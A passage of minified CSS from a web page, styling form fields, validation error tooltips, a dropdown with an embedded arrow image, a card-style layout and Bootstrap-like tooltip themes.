  ._2TIYoKdMB1jFeMZh68la7r ._18GtMPg_Y4Ey6S6Y7QNhUo {
    padding-top: 8px !important; }
  ._2TIYoKdMB1jFeMZh68la7r .X2CI2uTg9GRybMqREYIIu {
    padding-left: 8px !important;
    padding-right: 8px !important; }
  ._2TIYoKdMB1jFeMZh68la7r ._1J3A6ifUegkjkb_IEpTE61 {
    padding-bottom: 8px !important;
    padding-top: 8px !important; }
  ._2TIYoKdMB1jFeMZh68la7r ._18MD0SNT6B4zFHXUMM0RjZ {
    border-radius: 2px; }
  ._2TIYoKdMB1jFeMZh68la7r ._2u4fFyDFwPBhQD7HPt2KXb {
    border-radius: 50%; }
  ._2TIYoKdMB1jFeMZh68la7r ._3SBwzlNW9adjKKoPVcx2RE {
    text-align: left; }
  ._2TIYoKdMB1jFeMZh68la7r ._3Iuvm4_12HVlPUO13bnQsY {
    text-align: right; }
  ._2TIYoKdMB1jFeMZh68la7r ._1_Hi7BoHEItVmoC6JoVv6K {
    text-align: center; }
  ._2TIYoKdMB1jFeMZh68la7r ._3_Xf2LrUL6-NvljvZn7G2K {
    text-align: justify; }
  ._2TIYoKdMB1jFeMZh68la7r ._25I83sKiDNasdyL-D0yGF3 {
    text-transform: lowercase; }
  ._2TIYoKdMB1jFeMZh68la7r ._1IIbU0J3ev6mgvQMN6f2bo {
    text-transform: uppercase; }
  ._2TIYoKdMB1jFeMZh68la7r ._2nJ1J36ieFoIH3Url3WTl3 {
    text-transform: capitalize; }
  ._2TIYoKdMB1jFeMZh68la7r ._1IOIm986jA6RUarGSmwFcc {
    font-weight: normal; }
  ._2TIYoKdMB1jFeMZh68la7r ._3Vu2b_oFmBq-2nWOGjiqJ1 {
    font-weight: bold; }
  ._2TIYoKdMB1jFeMZh68la7r .A-mu_U0KzihSbhbNbDoHX {
    font-style: italic; }
  ._2TIYoKdMB1jFeMZh68la7r ._3P09b6VdrMt1-OwNztMZAJ {
    font-size: 1.2em; }
  ._2TIYoKdMB1jFeMZh68la7r ._2G2n7nla10ZTPwD9rjwC2M {
    overflow: hidden;
    text-overflow: ellipsis;
    white-space: nowrap; }
  ._2TIYoKdMB1jFeMZh68la7r ._1jfV8Sx5D5xnnKVLYxHnGX {
    overflow: hidden;
    text-overflow: clip;
    white-space: nowrap; }
  ._2TIYoKdMB1jFeMZh68la7r .cZY7FdibOjwjY_Qw8kNgL {
    hyphens: auto;
    word-break: break-word;
    word-wrap: break-word; }
  ._2TIYoKdMB1jFeMZh68la7r .pLKju5v7sW809fWwxCIjC {
    border-radius: 5px; }
    ._2TIYoKdMB1jFeMZh68la7r .pLKju5v7sW809fWwxCIjC.c_EqZyQ09y_WMI2YYG46r {
      padding: 0;
      border: none;
      vertical-align: baseline;
      font-weight: 400;
      height: auto; }
      ._2TIYoKdMB1jFeMZh68la7r .pLKju5v7sW809fWwxCIjC.c_EqZyQ09y_WMI2YYG46r:focus {
        box-shadow: none; }
    ._2TIYoKdMB1jFeMZh68la7r .pLKju5v7sW809fWwxCIjC._KJ5eBvMfCw0eJaPkYJyA + ._KJ5eBvMfCw0eJaPkYJyA {
      margin-top: 10px; }
  @media (max-width: 767px) {
    ._2TIYoKdMB1jFeMZh68la7r .pLKju5v7sW809fWwxCIjC, ._2TIYoKdMB1jFeMZh68la7r .pLKju5v7sW809fWwxCIjC._1lXunD4MrfET3yG1o_xe6g {
      font-size: 16px;
      font-weight: 500;
      height: 55px; } }
  ._2TIYoKdMB1jFeMZh68la7r input[type="text"].-BRXbz-joJHsl5yhjcJvv, ._2TIYoKdMB1jFeMZh68la7r input[type="email"].-BRXbz-joJHsl5yhjcJvv, ._2TIYoKdMB1jFeMZh68la7r input[type="tel"].-BRXbz-joJHsl5yhjcJvv, ._2TIYoKdMB1jFeMZh68la7r input[type="password"].-BRXbz-joJHsl5yhjcJvv {
    font-size: 14px;
    color: #232530;
    border-radius: 4px;
    background-color: #ffffff;
    height: 55px;
    border: 1px solid #bbc1cc;
    padding-left: 10px;
    padding-right: 10px; }
    ._2TIYoKdMB1jFeMZh68la7r input[type="text"].-BRXbz-joJHsl5yhjcJvv:focus, ._2TIYoKdMB1jFeMZh68la7r input[type="email"].-BRXbz-joJHsl5yhjcJvv:focus, ._2TIYoKdMB1jFeMZh68la7r input[type="tel"].-BRXbz-joJHsl5yhjcJvv:focus, ._2TIYoKdMB1jFeMZh68la7r input[type="password"].-BRXbz-joJHsl5yhjcJvv:focus {
      box-shadow: none; }
    ._2TIYoKdMB1jFeMZh68la7r input[type="text"].-BRXbz-joJHsl5yhjcJvv::placeholder, ._2TIYoKdMB1jFeMZh68la7r input[type="email"].-BRXbz-joJHsl5yhjcJvv::placeholder, ._2TIYoKdMB1jFeMZh68la7r input[type="tel"].-BRXbz-joJHsl5yhjcJvv::placeholder, ._2TIYoKdMB1jFeMZh68la7r input[type="password"].-BRXbz-joJHsl5yhjcJvv::placeholder {
      color: #9b9b9b; }
    ._2TIYoKdMB1jFeMZh68la7r input[type="text"].-BRXbz-joJHsl5yhjcJvv._2d0xuyYlG4hG70uxwVM2z6, ._2TIYoKdMB1jFeMZh68la7r input[type="email"].-BRXbz-joJHsl5yhjcJvv._2d0xuyYlG4hG70uxwVM2z6, ._2TIYoKdMB1jFeMZh68la7r input[type="tel"].-BRXbz-joJHsl5yhjcJvv._2d0xuyYlG4hG70uxwVM2z6, ._2TIYoKdMB1jFeMZh68la7r input[type="password"].-BRXbz-joJHsl5yhjcJvv._2d0xuyYlG4hG70uxwVM2z6 {
      height: 60px;
      font-size: 18px; }
    ._2TIYoKdMB1jFeMZh68la7r input[type="text"].-BRXbz-joJHsl5yhjcJvv.kCrwqYwsYcDk0I00HkG_z, ._2TIYoKdMB1jFeMZh68la7r input[type="email"].-BRXbz-joJHsl5yhjcJvv.kCrwqYwsYcDk0I00HkG_z, ._2TIYoKdMB1jFeMZh68la7r input[type="tel"].-BRXbz-joJHsl5yhjcJvv.kCrwqYwsYcDk0I00HkG_z, ._2TIYoKdMB1jFeMZh68la7r input[type="password"].-BRXbz-joJHsl5yhjcJvv.kCrwqYwsYcDk0I00HkG_z {
      color: #232530;
      background-color: #FFFFFF;
      border: 1px solid #e8e6e6; }
    ._2TIYoKdMB1jFeMZh68la7r input[type="text"].-BRXbz-joJHsl5yhjcJvv ~ ._1SZtj_HTYjMBoyziXDEs3J, ._2TIYoKdMB1jFeMZh68la7r input[type="email"].-BRXbz-joJHsl5yhjcJvv ~ ._1SZtj_HTYjMBoyziXDEs3J, ._2TIYoKdMB1jFeMZh68la7r input[type="tel"].-BRXbz-joJHsl5yhjcJvv ~ ._1SZtj_HTYjMBoyziXDEs3J, ._2TIYoKdMB1jFeMZh68la7r input[type="password"].-BRXbz-joJHsl5yhjcJvv ~ ._1SZtj_HTYjMBoyziXDEs3J {
      width: auto;
      height: auto;
      vertical-align: middle;
      display: flex;
      align-items: center;
      left: auto;
      right: auto; }
      ._2TIYoKdMB1jFeMZh68la7r input[type="text"].-BRXbz-joJHsl5yhjcJvv ~ ._1SZtj_HTYjMBoyziXDEs3J._1G-AvmaycfhUWGVKMiSKsA, ._2TIYoKdMB1jFeMZh68la7r input[type="email"].-BRXbz-joJHsl5yhjcJvv ~ ._1SZtj_HTYjMBoyziXDEs3J._1G-AvmaycfhUWGVKMiSKsA, ._2TIYoKdMB1jFeMZh68la7r input[type="tel"].-BRXbz-joJHsl5yhjcJvv ~ ._1SZtj_HTYjMBoyziXDEs3J._1G-AvmaycfhUWGVKMiSKsA, ._2TIYoKdMB1jFeMZh68la7r input[type="password"].-BRXbz-joJHsl5yhjcJvv ~ ._1SZtj_HTYjMBoyziXDEs3J._1G-AvmaycfhUWGVKMiSKsA {
        left: 1px; }
      ._2TIYoKdMB1jFeMZh68la7r input[type="text"].-BRXbz-joJHsl5yhjcJvv ~ ._1SZtj_HTYjMBoyziXDEs3J._19iFOa5w3RoalBufnk-kSe, ._2TIYoKdMB1jFeMZh68la7r input[type="email"].-BRXbz-joJHsl5yhjcJvv ~ ._1SZtj_HTYjMBoyziXDEs3J._19iFOa5w3RoalBufnk-kSe, ._2TIYoKdMB1jFeMZh68la7r input[type="tel"].-BRXbz-joJHsl5yhjcJvv ~ ._1SZtj_HTYjMBoyziXDEs3J._19iFOa5w3RoalBufnk-kSe, ._2TIYoKdMB1jFeMZh68la7r input[type="password"].-BRXbz-joJHsl5yhjcJvv ~ ._1SZtj_HTYjMBoyziXDEs3J._19iFOa5w3RoalBufnk-kSe {
        margin-right: 10px;
        right: 1px; }
  ._2TIYoKdMB1jFeMZh68la7r ._1xCS3I4b2VHnCZYxDERCm-, ._2TIYoKdMB1jFeMZh68la7r ._2Hc1AykRRhCEXfGen6nQ6f {
    display: inline-block;
    padding-left: 26px;
    padding-right: 0; }
    ._2TIYoKdMB1jFeMZh68la7r ._1xCS3I4b2VHnCZYxDERCm- input:focus + ._1SZtj_HTYjMBoyziXDEs3J, ._2TIYoKdMB1jFeMZh68la7r ._2Hc1AykRRhCEXfGen6nQ6f input:focus + ._1SZtj_HTYjMBoyziXDEs3J {
      box-shadow: none; }
    ._2TIYoKdMB1jFeMZh68la7r ._1xCS3I4b2VHnCZYxDERCm- ._1SZtj_HTYjMBoyziXDEs3J, ._2TIYoKdMB1jFeMZh68la7r ._2Hc1AykRRhCEXfGen6nQ6f ._1SZtj_HTYjMBoyziXDEs3J {
      background: #ffffff;
      border-color: #bbc1cc; }
  ._2TIYoKdMB1jFeMZh68la7r ._1xCS3I4b2VHnCZYxDERCm- input:checked + ._1SZtj_HTYjMBoyziXDEs3J:before {
    left: 3px;
    top: 0;
    margin: 0;
    box-sizing: content-box; }
  ._2TIYoKdMB1jFeMZh68la7r ._1xCS3I4b2VHnCZYxDERCm- ._1SZtj_HTYjMBoyziXDEs3J {
    border-radius: 2px; }
  ._2TIYoKdMB1jFeMZh68la7r select.rte-RI1f8kE5ujIEf6BlF {
    border-radius: 4px;
    height: 55px;
    padding-right: 36px;
    -webkit-appearance: none; }
    ._2TIYoKdMB1jFeMZh68la7r select.rte-RI1f8kE5ujIEf6BlF:not([multiple]):not([size]) {
      background-color: #ffffff;
      background-repeat: no-repeat;
      background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAUCAYAAADskT9PAAAAAXNSR0IArs4c6QAAAV5JREFUSA29lr1OwzAQgM+xurBVVeN3QN6yo0pI7FRIPA68De3CzsbEA1RB9BlM5gqElOMuwVEgP7Ud3Bvixj/3fbYTpxIosiybzeeLB6XS0hjzxnUx4lzr+2Wart6Nebb5JcMPH59bALwBEGuSeI0hwXAs8Q4QVqlSwkpInnkNr5xkDIkGbqdNEkulDoUxL0mSwEYI8dW0Ic5KhI3Wem3rppQdeJ2soJk+8U9Jy72nZc955nxft3M5fTsG4Ym4zPN8VwnwJYaEC7wR+G8JV/gvAQeJnFeK+42FD5zz2D1vch7ZjlEJX3ivAFeGSITABwV8JULhowKuElPgzBB8ORZ0KF3T4bRFOqRsXz68aPBjiXhr637KQrbe8z9tnVsnAR7VJ9HJBuAF5/Gdt6AnaVU18GC2u3vDebCzAHcekQiCewsMSATDgwTaEohwQQ/clf2wcNtJg/7MnJ0UGAP2DaPtGozgtrv0AAAAAElFTkSuQmCC);
      background-position: right 10px center;
      background-size: 16px; }
    ._2TIYoKdMB1jFeMZh68la7r select.rte-RI1f8kE5ujIEf6BlF:focus {
      box-shadow: none; }
  @media (max-width: 767px) {
    ._2TIYoKdMB1jFeMZh68la7r .-BRXbz-joJHsl5yhjcJvv {
      font-size: 16px; }
    ._2TIYoKdMB1jFeMZh68la7r ._1xCS3I4b2VHnCZYxDERCm-, ._2TIYoKdMB1jFeMZh68la7r ._2Hc1AykRRhCEXfGen6nQ6f {
      font-size: 16px; } }
  ._2TIYoKdMB1jFeMZh68la7r ._3aIcdH---IkPqM-X1ob4P4:not(:last-child) {
    margin-bottom: 16px; }
  ._2TIYoKdMB1jFeMZh68la7r ._3aIcdH---IkPqM-X1ob4P4._3hC4OLZ-1o1a5cNyGSdLyw {
    position: relative; }
    ._2TIYoKdMB1jFeMZh68la7r ._3aIcdH---IkPqM-X1ob4P4._3hC4OLZ-1o1a5cNyGSdLyw input.-BRXbz-joJHsl5yhjcJvv {
      background: #ffffff;
      border-color: #a94442; }
    ._2TIYoKdMB1jFeMZh68la7r ._3aIcdH---IkPqM-X1ob4P4._3hC4OLZ-1o1a5cNyGSdLyw select.rte-RI1f8kE5ujIEf6BlF {
      border-color: #a94442; }
    ._2TIYoKdMB1jFeMZh68la7r ._3aIcdH---IkPqM-X1ob4P4._3hC4OLZ-1o1a5cNyGSdLyw ._3Oeva_31ruRl328ll6v4jS {
      margin: 0;
      padding: 4px 8px;
      position: absolute;
      top: -8px;
      right: 0;
      transform: translateY(-100%);
      border-radius: 8px;
      background-color: #a94442;
      color: #ffffff;
      font-size: 12px;
      z-index: 2; }
      ._2TIYoKdMB1jFeMZh68la7r ._3aIcdH---IkPqM-X1ob4P4._3hC4OLZ-1o1a5cNyGSdLyw ._3Oeva_31ruRl328ll6v4jS:after {
        content: '';
        width: 0;
        height: 0;
        border-style: solid;
        border-width: 6px 6px 0 6px;
        border-color: #a94442 transparent transparent transparent;
        position: absolute;
        bottom: 0;
        right: 20px;
        transform: translateY(100%);
        z-index: 1; }
    ._2TIYoKdMB1jFeMZh68la7r ._3aIcdH---IkPqM-X1ob4P4._3hC4OLZ-1o1a5cNyGSdLyw ._1xCS3I4b2VHnCZYxDERCm- ._1SZtj_HTYjMBoyziXDEs3J, ._2TIYoKdMB1jFeMZh68la7r ._3aIcdH---IkPqM-X1ob4P4._3hC4OLZ-1o1a5cNyGSdLyw ._2Hc1AykRRhCEXfGen6nQ6f ._1SZtj_HTYjMBoyziXDEs3J {
      border-color: #a94442 !important; }
    ._2TIYoKdMB1jFeMZh68la7r ._3aIcdH---IkPqM-X1ob4P4._3hC4OLZ-1o1a5cNyGSdLyw ._1xCS3I4b2VHnCZYxDERCm- a, ._2TIYoKdMB1jFeMZh68la7r ._3aIcdH---IkPqM-X1ob4P4._3hC4OLZ-1o1a5cNyGSdLyw ._2Hc1AykRRhCEXfGen6nQ6f a {
      color: #a94442 !important; }
  ._2TIYoKdMB1jFeMZh68la7r ._3aIcdH---IkPqM-X1ob4P4 ._1vI7n9RzzRMrVkqvNh-Q_j {
    position: absolute;
    padding: 16px 10px;
    background-color: #efefef;
    border-radius: 5px;
    box-shadow: 0 0 4px -1px rgba(0, 0, 0, 0.8);
    max-width: 250px;
    width: 100%;
    z-index: 3;
    top: -1px;
    transform: translateY(-100%); }
    ._2TIYoKdMB1jFeMZh68la7r ._3aIcdH---IkPqM-X1ob4P4 ._1vI7n9RzzRMrVkqvNh-Q_j ._3e4Osh9Bke00HdCBy_ScjU {
      font-size: 14px;
      color: #232530;
      margin-bottom: 10px; }
    ._2TIYoKdMB1jFeMZh68la7r ._3aIcdH---IkPqM-X1ob4P4 ._1vI7n9RzzRMrVkqvNh-Q_j ul {
      margin: 0;
      padding: 0; }
      ._2TIYoKdMB1jFeMZh68la7r ._3aIcdH---IkPqM-X1ob4P4 ._1vI7n9RzzRMrVkqvNh-Q_j ul ._2JwN1UV8Ir3-fZ0-GIZDrE {
        position: relative;
        list-style: none;
        padding-left: 21px;
        color: #9b9b9b; }
        ._2TIYoKdMB1jFeMZh68la7r ._3aIcdH---IkPqM-X1ob4P4 ._1vI7n9RzzRMrVkqvNh-Q_j ul ._2JwN1UV8Ir3-fZ0-GIZDrE:before {
          content: '';
          width: 11px;
          height: 11px;
          border-radius: 50%;
          background-color: #b2b4b6;
          position: absolute;
          left: 0;
          top: 5px; }
        ._2TIYoKdMB1jFeMZh68la7r ._3aIcdH---IkPqM-X1ob4P4 ._1vI7n9RzzRMrVkqvNh-Q_j ul ._2JwN1UV8Ir3-fZ0-GIZDrE:after {
          content: '';
          width: 3px;
          height: 6px;
          border: solid #ffffff;
          border-width: 0 1px 1px 0;
          transform: translate(100%, 100%) rotate(45deg);
          position: absolute;
          left: 1px;
          top: 1px;
          box-sizing: border-box; }
        ._2TIYoKdMB1jFeMZh68la7r ._3aIcdH---IkPqM-X1ob4P4 ._1vI7n9RzzRMrVkqvNh-Q_j ul ._2JwN1UV8Ir3-fZ0-GIZDrE span {
          color: #56a4ff; }
        ._2TIYoKdMB1jFeMZh68la7r ._3aIcdH---IkPqM-X1ob4P4 ._1vI7n9RzzRMrVkqvNh-Q_j ul ._2JwN1UV8Ir3-fZ0-GIZDrE._3_AhUgN6BzqfVxmx3z8uJG:before {
          background-color: #56a4ff; }
    ._2TIYoKdMB1jFeMZh68la7r ._3aIcdH---IkPqM-X1ob4P4 ._1vI7n9RzzRMrVkqvNh-Q_j .R4OQ1GxcTQvbvh6kIJPqp {
      width: 25px;
      height: 13px;
      position: absolute;
      overflow: hidden;
      bottom: 0;
      transform: translateY(100%);
      left: 10px; }
      ._2TIYoKdMB1jFeMZh68la7r ._3aIcdH---IkPqM-X1ob4P4 ._1vI7n9RzzRMrVkqvNh-Q_j .R4OQ1GxcTQvbvh6kIJPqp:after {
        content: "";
        position: absolute;
        width: 22px;
        height: 22px;
        background: #efefef;
        transform: rotate(45deg);
        top: -17px;
        left: 2px;
        box-shadow: 1px 1px 4px -2px rgba(0, 0, 0, 0.8); }
  ._2TIYoKdMB1jFeMZh68la7r ._3aIcdH---IkPqM-X1ob4P4.CrtuiQWH9qJBRVJ1mawMb .-BRXbz-joJHsl5yhjcJvv {
    padding-right: 30px !important; }
  ._2TIYoKdMB1jFeMZh68la7r ._2IyGaglR-A9BGrFMyxXAti {
    display: flex;
    flex-direction: column;
    justify-content: space-between;
    height: 100%; }
    ._2TIYoKdMB1jFeMZh68la7r ._2IyGaglR-A9BGrFMyxXAti._2uURFD0x_nH6zJhLlID7JU {
      width: calc(420px - 40px); }
    ._2TIYoKdMB1jFeMZh68la7r ._2IyGaglR-A9BGrFMyxXAti._1rG62S9vCp9aF0dXp3GQGY {
      width: calc(605px - 40px); }
    ._2TIYoKdMB1jFeMZh68la7r ._2IyGaglR-A9BGrFMyxXAti ._2CCIWtSyyVVCurG94EQ2uN {
      font-family: 'Work Sans', sans-serif;
      font-size: 18px;
      font-weight: normal;
      color: #000000;
      margin-top: 0;
      margin-bottom: 16px;
      display: block; }
    ._2TIYoKdMB1jFeMZh68la7r ._2IyGaglR-A9BGrFMyxXAti ._2IVSiHRwrdRI9PLOajbDI9 {
      margin-top: 32px; }
    @media (max-width: 1024px) {
      ._2TIYoKdMB1jFeMZh68la7r ._2IyGaglR-A9BGrFMyxXAti._2uURFD0x_nH6zJhLlID7JU, ._2TIYoKdMB1jFeMZh68la7r ._2IyGaglR-A9BGrFMyxXAti._1rG62S9vCp9aF0dXp3GQGY {
        width: auto;
        justify-content: flex-start; } }
    @media (max-width: 767px) {
      ._2TIYoKdMB1jFeMZh68la7r ._2IyGaglR-A9BGrFMyxXAti {
        font-size: 16px; }
        ._2TIYoKdMB1jFeMZh68la7r ._2IyGaglR-A9BGrFMyxXAti ._2IVSiHRwrdRI9PLOajbDI9 {
          margin-top: 16px; } }
  ._2TIYoKdMB1jFeMZh68la7r ._3fJo5V9Hp-tmBdz6-imvIP.fX2mQD3TvtX-oWRW3-XhX {
    align-items: center; }
</style><style type="text/css">._2YyGVGa2ZcX_c7NLKdCAqV {
  display: inline-flex;
  align-items: center; }
  ._2YyGVGa2ZcX_c7NLKdCAqV svg {
    width: 100%;
    height: 100%; }
</style><style type="text/css">.QBCrEHOZlG-o7gvaj8syW {
  display: flex;
  width: 100%;
  height: 225px; }
  .QBCrEHOZlG-o7gvaj8syW .y21jy4U_p8-auoP0kfkOO {
    display: flex;
    flex-direction: column;
    width: 100%;
    border-radius: 6px;
    background-color: #eff2f7;
    z-index: 1;
    padding-top: 32px;
    padding-left: 13px;
    padding-right: 13px;
    margin-right: -10px; }
    .QBCrEHOZlG-o7gvaj8syW .y21jy4U_p8-auoP0kfkOO input._1LOGY6JF5Uvjb7xnLsfJ7k {
      padding-left: 52px; }
    .QBCrEHOZlG-o7gvaj8syW .y21jy4U_p8-auoP0kfkOO ._34MTUb8wIP4kKyD-aUYHsS {
      float: right; }
  .QBCrEHOZlG-o7gvaj8syW ._2TeeejuLttrRpSep-nPRC0 {
    position: relative;
    width: 138px;
    border-radius: 6px;
    background-color: #cbcfd5;
    padding-right: 17px;
    display: flex;
    align-items: flex-start;
    flex-direction: column;
    justify-content: flex-end;
    z-index: 0; }
    .QBCrEHOZlG-o7gvaj8syW ._2TeeejuLttrRpSep-nPRC0 ._3PumhGCPJbkvjJju5bDux {
      position: absolute;
      top: 33px;
      right: 17px;
      width: 104px;
      height: 50px;
      background-color: #292a2b; }
    .QBCrEHOZlG-o7gvaj8syW ._2TeeejuLttrRpSep-nPRC0 ._1eBMJe7AG6oG56lUmbLlKd {
      position: absolute;
      margin: 0 17px;
      left: 0;
      bottom: 5px; }
      .QBCrEHOZlG-o7gvaj8syW ._2TeeejuLttrRpSep-nPRC0 ._1eBMJe7AG6oG56lUmbLlKd ._377XzGMShOc6XlVIDVdB_l {
        margin-left: 3px;
        cursor: pointer;
        vertical-align: middle; }
  @media (max-width: 1024px) {
    .QBCrEHOZlG-o7gvaj8syW {
      flex-direction: column;
      height: 100%; }
      .QBCrEHOZlG-o7gvaj8syW .y21jy4U_p8-auoP0kfkOO {
        padding-left: 16px;
        padding-right: 16px;
        border-bottom-left-radius: 0;
        border-bottom-right-radius: 0; }
      .QBCrEHOZlG-o7gvaj8syW ._2TeeejuLttrRpSep-nPRC0 {
        width: 100%;
        padding: 0 16px 32px;
        border-top-left-radius: 0;
        border-top-right-radius: 0;
        background-color: #eff2f7;
        z-index: auto; }
        .QBCrEHOZlG-o7gvaj8syW ._2TeeejuLttrRpSep-nPRC0 ._3PumhGCPJbkvjJju5bDux {
          display: none; }
        .QBCrEHOZlG-o7gvaj8syW ._2TeeejuLttrRpSep-nPRC0 ._1eBMJe7AG6oG56lUmbLlKd {
          position: relative;
          margin: 0;
          left: auto;
          top: auto;
          width: 100%;
          bottom: 0; } }
  @media (max-width: 767px) {
    .QBCrEHOZlG-o7gvaj8syW {
      position: relative; }
      .QBCrEHOZlG-o7gvaj8syW:before, .QBCrEHOZlG-o7gvaj8syW:after {
        content: '';
        position: absolute;
        width: 16px;
        left: -16px;
        bottom: 0;
        top: 0;
        background-color: #eff2f7; }
      .QBCrEHOZlG-o7gvaj8syW:after {
        left: auto;
        right: -16px; }
      .QBCrEHOZlG-o7gvaj8syW .y21jy4U_p8-auoP0kfkOO, .QBCrEHOZlG-o7gvaj8syW ._2TeeejuLttrRpSep-nPRC0 {
        border-radius: 0;
        padding-left: 0;
        padding-right: 0; }
      .QBCrEHOZlG-o7gvaj8syW .y21jy4U_p8-auoP0kfkOO ._34MTUb8wIP4kKyD-aUYHsS {
        display: block;
        float: none;
        margin-bottom: 16px; } }

._3D_SSv4iRyTMGjA3rvLPfz {
  height: 197px;
  overflow-y: scroll;
  padding-right: 15px;
  margin-right: -15px; }
  @media (max-width: 767px) {
    ._3D_SSv4iRyTMGjA3rvLPfz {
      height: auto; } }

._1icUUs_Tv4OaqiHI_H0Uzj {
  position: relative;
  display: flex;
  align-items: center;
  height: 55px;
  padding: 0 50px 0 10px;
  background-color: #FFFFFF;
  border: 1px solid #bbc1cc;
  border-radius: 5px; }
  ._1icUUs_Tv4OaqiHI_H0Uzj.Bu3plbKoNuF8rw6eNxJWl {
    background-color: #eff2f7; }
  ._1icUUs_Tv4OaqiHI_H0Uzj._3K05xe_xWCouMbdUbOLWpl {
    padding-left: 0; }
  ._1icUUs_Tv4OaqiHI_H0Uzj ._1cx8PNXXfLf91s0cgLyW3o {
    display: flex;
    flex: 1;
    align-items: center;
    cursor: pointer; }
    ._1icUUs_Tv4OaqiHI_H0Uzj ._1cx8PNXXfLf91s0cgLyW3o ._3Z72EkSt-iwDVwIaCgBePX {
      top: auto; }
  ._1icUUs_Tv4OaqiHI_H0Uzj ._1YHJXWsxe4SoVJTMSr9VTt {
    flex: 1; }
  ._1icUUs_Tv4OaqiHI_H0Uzj .WGCM36iuwgFPxBUp6dTyg {
    margin-right: 20px;
    vertical-align: bottom; }
  ._1icUUs_Tv4OaqiHI_H0Uzj .iRpHECj5y4PaAUGpZr_Xe {
    white-space: nowrap;
    position: absolute;
    right: 10px;
    display: flex;
    align-items: center; }
  @media (max-width: 767px) {
    ._1icUUs_Tv4OaqiHI_H0Uzj {
      height: 80px; }
      ._1icUUs_Tv4OaqiHI_H0Uzj .iRpHECj5y4PaAUGpZr_Xe {
        flex-direction: column; } }
</style><style type="text/css">.tooltip.blu-tooltip.dark .tooltip-inner {
  color: #ffffff;
  background-color: #242630;
  letter-spacing: 1px;
  max-width: 300px;
  border-radius: 4px;
  padding: 5px 10px; }

.tooltip.blu-tooltip.dark.bs-tooltip-top .arrow {
  border-top-color: #242630; }

.tooltip.blu-tooltip.dark.bs-tooltip-bottom .arrow {
  border-bottom-color: #242630; }

.tooltip.blu-tooltip.dark.bs-tooltip-right .arrow {
  border-right-color: #242630; }

.tooltip.blu-tooltip.dark.bs-tooltip-left .arrow {
  border-left-color: #242630; }

.tooltip.blu-tooltip.dark.show {
  opacity: .9; }

.tooltip.blu-tooltip.light .tooltip-inner {
  color: #2f3141;
  background-color: #EFEFEF;
  letter-spacing: normal;
  max-width: 388px;
  border-radius: 5px;
  box-shadow: 0 2px 4px 0 rgba(0, 0, 0, 0.5);
  padding: 16px; }

.tooltip.blu-tooltip.light .arrow {
  border: 12px solid transparent; }

.tooltip.blu-tooltip.light.bs-tooltip-top .tooltip-inner {
  margin-bottom: 18px; }

.tooltip.blu-tooltip.light.bs-tooltip-top .arrow {
  bottom: 6px;
  border-top-color: #EFEFEF; }

.tooltip.blu-tooltip.light.bs-tooltip-bottom .tooltip-inner {
  margin-top: 18px; }

.tooltip.blu-tooltip.light.bs-tooltip-bottom .arrow {
  top: 6px;
  border-bottom-color: #EFEFEF; }

.tooltip.blu-tooltip.light.bs-tooltip-right .tooltip-inner {
  margin-left: 18px; }

.tooltip.blu-tooltip.light.bs-tooltip-right .arrow {
  left: 6px;
  border-right-color: #EFEFEF; }

.tooltip.blu-tooltip.light.bs-tooltip-left .tooltip-inner {
  margin-right: 18px; }

.tooltip.blu-tooltip.light.bs-tooltip-left .arrow {
  right: 6px;
  border-left-color: #EFEFEF; }

.tooltip.blu-tooltip.light.show {
  opacity: 1; }

.tooltip.blu-tooltip .tooltip-inner {
  font-family: 'Work Sans', sans-serif;
  font-size: 14px;
  font-weight: 400;
  text-align: left; }

.tooltip.blu-tooltip .arrow {
  position: absolute;
  width: 0;
  height: 0;
  border: 5px solid transparent; }

.tooltip.blu-tooltip.bs-tooltip-top .tooltip-inner {
  margin-bottom: 10px; }

.tooltip.blu-tooltip.bs-tooltip-top .arrow {
  bottom: 5px;
  border-bottom-width: 0; }

.tooltip.blu-tooltip.bs-tooltip-bottom .tooltip-inner {
  margin-top: 10px; }

.tooltip.blu-tooltip.bs-tooltip-bottom .arrow {
  top: 5px;
  border-top-width: 0; }

.tooltip.blu-tooltip.bs-tooltip-right .tooltip-inner {
  margin-left: 10px; }

.tooltip.blu-tooltip.bs-tooltip-right .arrow {
  left: 5px;
  border-left-width: 0; }

.tooltip.blu-tooltip.bs-tooltip-left .tooltip-inner {
  margin-right: 10px; }

.tooltip.blu-tooltip.bs-tooltip-left .arrow {
  right: 5px;
  border-right-width: 0; }

.tooltip.blu-tooltip.show {
  z-index: 9999; }

@media (max-width: 767px) {
  .tooltip.blu-tooltip.light .tooltip-inner {
    max-width: 300px; } }
</style><style type="text/css">._2NS58vx81Eay4SNu5dtatO {
  display: flex;
  height: 100%;
  -webkit-font-smoothing: antialiased;
  -moz-osx-font-smoothing: grayscale;
  font-size: 14px;
  color: #232530;
  font-family: "Work Sans", sans-serif;
  line-height: 1.5;
  position: relative; }
  ._2NS58vx81Eay4SNu5dtatO ._2JkyUBTkFKiFMXmejHX5ii {
    position: absolute;
    top: 15px;
    right: 15px;
    display: flex;
    padding: 5px;
    cursor: pointer;
    z-index: 2; }

._3XYbTXhnKqYybHudydJNJo {
  width: 260px;
  background-color: #eff2f7;
  padding-top: 60px;
  padding-bottom: 30px; }
  ._3XYbTXhnKqYybHudydJNJo img {
    display: block;
    margin-bottom: 30px;
    width: 100%; }
  ._3XYbTXhnKqYybHudydJNJo ._1ParNVImgDUOEG9GUL-0vm {
    padding-left: 16px;
    padding-right: 16px; }
    ._3XYbTXhnKqYybHudydJNJo ._1ParNVImgDUOEG9GUL-0vm ._1NsyHjGPJ2PxUGfD6kELEr {
      display: block;
      font-size: 18px;
      line-height: 1.3;
      margin-bottom: 10px; }
    ._3XYbTXhnKqYybHudydJNJo ._1ParNVImgDUOEG9GUL-0vm ._8JLwnFngmfhazJyTvpMUw {
      font-size: 14px;
      color: #9b9b9b;
      line-height: 1.5;
      margin: 0; }

._2Urpk462RLB9Sib_Sf_E3h {
  flex: 1;
  padding: 60px 20px 30px 20px; }

@media (max-width: 767px) {
  ._2NS58vx81Eay4SNu5dtatO {
    flex-direction: column; }
    ._2NS58vx81Eay4SNu5dtatO ._2JkyUBTkFKiFMXmejHX5ii path {
      fill: #ffffff; }
  ._3XYbTXhnKqYybHudydJNJo {
    width: 100%;
    padding-top: 0;
    padding-bottom: 16px; }
    ._3XYbTXhnKqYybHudydJNJo:before {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      right: 0;
      height: 102px;
      opacity: 0.63;
      background-image: linear-gradient(to top, rgba(0, 0, 0, 0), #000000);
      z-index: 1; }
    ._3XYbTXhnKqYybHudydJNJo img {
      width: 100%;
      margin-bottom: 16px; }
